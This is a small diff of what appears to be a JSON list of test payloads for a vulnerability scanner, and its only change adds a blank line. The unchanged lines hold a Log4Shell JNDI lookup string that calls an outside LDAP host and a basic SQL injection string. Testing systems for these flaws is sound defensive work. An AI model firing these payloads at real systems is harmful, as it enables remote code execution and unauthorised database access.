@@ -2,3 +2,4 @@
     {"id":"log4shell","payload":"${jndi:ldap://log4shell.huntress.com:1389/<id>}"},
     {"id":"mysqli-basic","payload":"' or 1=1-- -"}
 ]
+
